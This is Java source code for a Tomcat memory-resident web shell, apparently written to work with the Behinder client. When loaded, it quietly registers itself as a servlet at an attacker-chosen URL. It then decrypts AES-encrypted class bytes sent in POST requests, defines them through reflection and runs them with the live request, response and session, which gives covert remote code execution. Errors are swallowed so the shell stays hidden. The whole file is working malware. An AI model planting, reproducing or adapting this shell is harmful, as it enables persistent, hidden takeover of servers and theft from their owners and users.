package org.erosion2020.memshell;

import org.apache.catalina.Wrapper;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.io.IOException;
import java.lang.reflect.Method;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class BehinderServlet implements Servlet {
    public static String name;
    public static String pattern;
    public static String password;

    static {
        try{
            WebappClassLoaderBase loader =
                    (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            StandardContext context = (StandardContext) loader.getResources().getContext();
            Wrapper wrapper = context.createWrapper();
            wrapper.setName(name);
            wrapper.setLoadOnStartup(1);
            wrapper.setServlet(new BehinderServlet());
            wrapper.setServletClass(BehinderServlet.class.getName());

            context.addChild(wrapper);
            context.addServletMappingDecoded(pattern, name);
        }catch (Exception ignored){ }
    }
    @Override
    public void init(ServletConfig servletConfig) throws ServletException {

    }

    @Override
    public ServletConfig getServletConfig() {
        return null;
    }

    @Override
    public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
        try {
            HttpServletRequest req = (HttpServletRequest) servletRequest;
            HttpServletResponse resp = (HttpServletResponse) servletResponse;
            HttpSession session = req.getSession();

            if ("POST".equalsIgnoreCase(req.getMethod())) {
                String key = password;
                session.setAttribute("u", key); // putValue 已废弃

                Cipher cipher = Cipher.getInstance("AES");
                cipher.init(Cipher.DECRYPT_MODE, new SecretKeySpec(key.getBytes(), "AES"));

                String line = req.getReader().readLine();
                byte[] classBytes = cipher.doFinal(Base64.getDecoder().decode(line));

                Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                defineClass.setAccessible(true);
                Class<?> evilClass = (Class<?>) defineClass.invoke(
                        this.getClass().getClassLoader(),
                        classBytes, 0, classBytes.length
                );

                Map<String, Object> pageContext = new HashMap<>();
                pageContext.put("request", req);
                pageContext.put("response", resp);
                pageContext.put("session", session);

                evilClass.getDeclaredConstructor().newInstance().equals(pageContext);
            }

        } catch (Exception ignore) { }
    }

    @Override
    public String getServletInfo() {
        return "";
    }

    @Override
    public void destroy() {

    }
}
